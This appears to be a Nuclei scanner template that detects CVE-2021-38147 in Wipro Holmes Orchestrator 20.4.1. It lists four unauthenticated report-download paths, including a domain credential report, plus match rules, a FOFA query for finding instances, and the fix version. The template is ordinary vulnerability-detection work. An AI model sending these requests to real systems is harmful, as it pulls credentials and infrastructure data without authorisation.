http:
- matchers:
  - condition: and
    dsl:
    - contains_all(header, 'application/vnd.openxml', 'attachment; filename=')
    - contains(body, '<?xml version=')
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/processexecution/DownloadExcelFile/Domain_Credential_Report_Excel'
  - '{{BaseURL}}/processexecution/DownloadExcelFile/Process_Report_Excel'
  - '{{BaseURL}}/processexecution/DownloadExcelFile/Infrastructure_Report_Excel'
  - '{{BaseURL}}/processexecution/DownloadExcelFile/Resolver_Report_Excel'
  stop-at-first-match: true
id: CVE-2021-38147
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:wipro:holmes:20.4.1:*:*:*:*:*:*:*
    cve-id: CVE-2021-38147
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-306
    epss-percentile: 0.98313
    epss-score: 0.63253
  description: 'Wipro Holmes Orchestrator 20.4.1 (20.4.1_02_11_2020) allows remote
    attackers to download arbitrary files, such as reports containing sensitive information,
    because authentication is not required for API access to processexecution/DownloadExcelFile/Domain_Credential_Report_Excel,
    processexecution/DownloadExcelFile/User_Report_Excel, processexecution/DownloadExcelFile/Process_Report_Excel,
    processexecution/DownloadExcelFile/Infrastructure_Report_Excel, or processexecution/DownloadExcelFile/Resolver_Report_Excel.

    '
  impact: 'Unauthenticated attackers can download sensitive reports containing Domain
    Credentials, User Information, Process Details, Infrastructure Data, and Resolver
    Information without authentication.

    '
  metadata:
    fofa-query: title="Holmes Orchestrator"
    max-request: 4
    product: holmes
    vendor: wipro
  name: Wipro Holmes Orchestrator 20.4.1 - Information Disclosure
  reference:
  - https://packetstormsecurity.com/files/165039/Wipro-Holmes-Orchestrator-20.4.1-Report-Disclosure.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-38147
  - https://www.wipro.com/holmes/
  remediation: 'Fixed In v21.4.0

    '
  severity: high
  tags: cve,cve2021,wipro,holmes,orchestrator,vuln
